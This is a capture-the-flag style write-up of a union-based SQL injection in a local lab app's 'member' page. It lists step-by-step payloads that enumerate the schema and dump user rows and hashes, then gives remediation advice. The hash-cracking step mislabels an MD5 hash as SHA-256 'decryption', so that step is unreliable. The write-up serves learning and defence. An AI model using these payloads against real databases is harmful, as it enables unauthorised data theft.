# SQL Injection (member)

**One‑liner:** The `id` parameter is concatenated into a SQL query **without quotes/parameterization**. We inject `UNION SELECT` to read the DB (tables, columns, data) and retrieve the hint/token.

---

## Where

* **URL:** `http://127.0.0.1:8080/index.php?page=member`
* **Param:** `id` (GET)
* **Auth:** none

**Error clue:** typing `test` shows `Unknown column 'test' in 'where clause'` → numeric, unquoted context.

---

## How to reproduce (paste directly in the `id` input)

1. **Column count = 2**

```
-1 UNION SELECT 1,2 --
```

(`...1,2,3` fails → 2 columns only)

2. **Which column is reflected** (avoid quotes; use hex string → `COL_A`)

```
-1 UNION SELECT 0x434F4C5F41,1 --
-1 UNION SELECT 1,0x434F4C5F41 --
```

(Both show up → both columns reflected.)

3. **Basic info**

```
-1 UNION SELECT 1,@@version --
-1 UNION SELECT 1,user() --
-1 UNION SELECT 1,database() --
```

4. **List tables** (current DB)

```
-1 UNION SELECT GROUP_CONCAT(table_name),1 FROM information_schema.tables WHERE table_schema=database() --
```

(e.g., shows `users`)

5. **List columns of `users`** (use hex for the table name to avoid quotes)

```
-1 UNION SELECT 1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=0x7573657273 --
```

Result observed:

```
user_id,first_name,last_name,town,country,planet,Commentaire,countersign
```

6. **Dump rows** (compact, per row)

```
-1 UNION SELECT 1,CONCAT_WS(':',user_id,first_name,last_name,Commentaire,countersign) FROM users --
```

**Observed sample:**

```
1:one:me:Je pense, donc je suis:2b3366bcfd44f540e630d4dc2b9b06d9,
2:two:me:Aamu on iltaa viisaampi.:60e9032c586fb422e2c16dee6286cf10,
3:three:me:Dublin is a city of stories and secrets.:e083b24a01c483437bcf4a9eea7c1b4d,
5:Flag:GetThe:Decrypt this password -> then lower all the char. Sh256 on it and it's good !:5ff9d0165b4f92b14994e5c685cdce28
```

7. **Ciphertext decryption**

```
5ff9d0165b4f92b14994e5c685cdce28 -> (decypher SHA-256) FortyTwo -> (lowercase) fortytwo -> (cypher SHA-256) 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```
---

## Why this happens

* The app builds SQL by concatenating `id` into `WHERE id = <id>` (no quotes, no placeholders).
* No server‑side validation or prepared statements → our input becomes executable SQL.

---

## Impact

* Read/alter database contents, enumerate schema, extract secrets.

**Severity:** Critical (no auth, trivial exploitation, full read access).

---

## Fix (server‑side — mandatory)

1. **Prepared statements** + bound parameters (integer for `id`).
2. **Validate input**: accept only positive integers; reject the rest.
3. **Least privilege** DB user; no FILE/SUPER; generic error messages (log server‑side).
4. **Output handling**: never echo raw DB errors.

---

## References

* OWASP Cheat Sheet: **SQL Injection Prevention**
* CWE‑89: **SQL Injection**
* (Context) **MariaDB/MySQL** functions: `GROUP_CONCAT`, `CONCAT_WS`, `information_schema.*`
